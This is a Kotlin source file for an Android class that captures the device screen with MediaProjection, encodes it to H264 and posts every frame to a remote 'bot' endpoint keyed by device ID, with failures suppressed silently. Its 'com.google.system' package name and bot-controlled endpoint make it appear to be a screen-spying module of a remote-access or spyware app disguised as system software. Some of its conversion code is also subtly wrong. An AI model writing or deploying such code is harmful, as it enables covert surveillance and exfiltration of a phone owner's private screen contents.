package com.google.system

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.TimeUnit

class LiveStreamEncoder(
    private val context: Context,
    private val botUrl: String,
    private val deviceId: String,
    private val onStatus: (String) -> Unit = {}
) {
    companion object {
        private const val STREAM_WIDTH = 480
        private const val STREAM_HEIGHT = 360
        private const val STREAM_FPS = 30
        private const val STREAM_BITRATE = 1000000 // 1 Mbps
        private const val IFRAME_INTERVAL = 2 // seconds
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private var mediaCodec: MediaCodec? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isStreaming = false
    private var frameCount = 0
    private var startTime = 0L
    private var handler: Handler? = null
    private var frameRunnable: Runnable? = null

    fun start(projection: MediaProjection) {
        if (isStreaming) return
        
        try {
            onStatus("Initializing encoder...")
            
            // Setup MediaCodec for H264 encoding
            val format = MediaFormat.createVideoFormat(
                MediaFormat.MIMETYPE_VIDEO_AVC,
                STREAM_WIDTH,
                STREAM_HEIGHT
            ).apply {
                setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
                setInteger(MediaFormat.KEY_BIT_RATE, STREAM_BITRATE)
                setInteger(MediaFormat.KEY_FRAME_RATE, STREAM_FPS)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, IFRAME_INTERVAL)
            }

            mediaCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
            mediaCodec?.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            mediaCodec?.start()

            // Create ImageReader for frame capture
            imageReader = ImageReader.newInstance(
                STREAM_WIDTH,
                STREAM_HEIGHT,
                PixelFormat.RGBA_8888,
                2
            )

            // Create virtual display
            virtualDisplay = projection.createVirtualDisplay(
                "LiveStream",
                STREAM_WIDTH,
                STREAM_HEIGHT,
                context.resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null,
                null
            )

            isStreaming = true
            frameCount = 0
            startTime = System.currentTimeMillis()
            handler = Handler(Looper.getMainLooper())

            onStatus("Stream started: ${STREAM_WIDTH}x${STREAM_HEIGHT}@${STREAM_FPS}fps")

            // Start frame capture loop
            startFrameCapture()

        } catch (e: Exception) {
            onStatus("Encoder error: ${e.message}")
            stop()
        }
    }

    private fun startFrameCapture() {
        val frameInterval = 1000L / STREAM_FPS
        
        frameRunnable = object : Runnable {
            override fun run() {
                if (!isStreaming) return
                
                try {
                    captureAndSendFrame()
                } catch (e: Exception) {
                    // Skip frame on error
                }
                
                handler?.postDelayed(this, frameInterval)
            }
        }
        
        handler?.post(frameRunnable!!)
    }

    private fun captureAndSendFrame() {
        val image = imageReader?.acquireLatestImage() ?: return
        
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * STREAM_WIDTH

            // Create bitmap from image
            val bitmap = Bitmap.createBitmap(
                STREAM_WIDTH + rowPadding / pixelStride,
                STREAM_HEIGHT,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            // Encode to H264
            encodeFrame(bitmap)

            bitmap.recycle()
            frameCount++

        } finally {
            image.close()
        }
    }

    private fun encodeFrame(bitmap: Bitmap) {
        val codec = mediaCodec ?: return
        
        try {
            // Convert bitmap to YUV and feed to codec
            val inputBufferIndex = codec.dequeueInputBuffer(10000)
            if (inputBufferIndex >= 0) {
                val inputBuffer = codec.getInputBuffer(inputBufferIndex)
                inputBuffer?.clear()
                
                // Convert ARGB to YUV
                val yuvData = bitmapToYUV(bitmap)
                inputBuffer?.put(yuvData)
                
                codec.queueInputBuffer(
                    inputBufferIndex,
                    0,
                    yuvData.size,
                    System.nanoTime() / 1000,
                    0
                )
            }

            // Get encoded output
            val bufferInfo = MediaCodec.BufferInfo()
            val outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
            if (outputBufferIndex >= 0) {
                val outputBuffer = codec.getOutputBuffer(outputBufferIndex)
                if (outputBuffer != null && bufferInfo.size > 0) {
                    val frameData = ByteArray(bufferInfo.size)
                    outputBuffer.get(frameData)
                    outputBuffer.clear()
                    
                    // Send frame to bot
                    sendFrameToBot(frameData)
                }
                codec.releaseOutputBuffer(outputBufferIndex, false)
            }

        } catch (e: Exception) {
            // Skip frame on encoding error
        }
    }

    private fun bitmapToYUV(bitmap: Bitmap): ByteArray {
        val width = bitmap.width
        val height = bitmap.height
        val yPlaneSize = width * height
        val uvPlaneSize = width * height / 4
        val yuvData = ByteArray(yPlaneSize + 2 * uvPlaneSize)

        val pixels = IntArray(width * height)
        bitmap.getPixels(pixels, 0, width, 0, 0, width, height)

        var yIndex = 0
        var uIndex = yPlaneSize
        var vIndex = yPlaneSize + uvPlaneSize

        for (j in 0 until height) {
            for (i in 0 until width) {
                val pixel = pixels[j * width + i]
                val r = (pixel shr 16) and 0xff
                val g = (pixel shr 8) and 0xff
                val b = pixel and 0xff

                // BT.601 conversion — full range
                val y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                val u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                val v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128

                yuvData[yIndex++] = y.toByte()

                // Subsample UV (4:2:0) — I420: Y plane then U plane then V plane
                if (j % 2 == 0 && i % 2 == 0) {
                    yuvData[uIndex++] = u.toByte()
                    yuvData[vIndex++] = v.toByte()
                }
            }
        }

        return yuvData
    }

    private fun sendFrameToBot(frameData: ByteArray) {
        // Send frame to bot HTTP endpoint
        try {
            val body = frameData.toRequestBody("application/octet-stream".toMediaType())
            val request = Request.Builder()
                .url("$botUrl/api/stream/$deviceId/frame")
                .post(body)
                .build()
            
            // Use async to not block frame capture
            client.newCall(request).enqueue(object : okhttp3.Callback {
                override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {
                    // Silently fail - frames will be dropped
                }
                
                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            // Silently fail
        }
    }

    fun stop() {
        isStreaming = false
        handler?.removeCallbacksAndMessages(null)
        handler = null
        frameRunnable = null
        
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        try { mediaCodec?.stop() } catch (_: Exception) {}
        try { mediaCodec?.release() } catch (_: Exception) {}
        
        virtualDisplay = null
        imageReader = null
        mediaCodec = null
        
        val elapsed = System.currentTimeMillis() - startTime
        onStatus("Stream stopped. Frames: $frameCount, Time: ${elapsed/1000}s")
    }

    fun isStreaming(): Boolean = isStreaming
    
    fun getStats(): String {
        val elapsed = System.currentTimeMillis() - startTime
        val fps = if (elapsed > 0) (frameCount * 1000 / elapsed).toInt() else 0
        return "Frames: $frameCount | FPS: $fps | Time: ${elapsed/1000}s"
    }
}
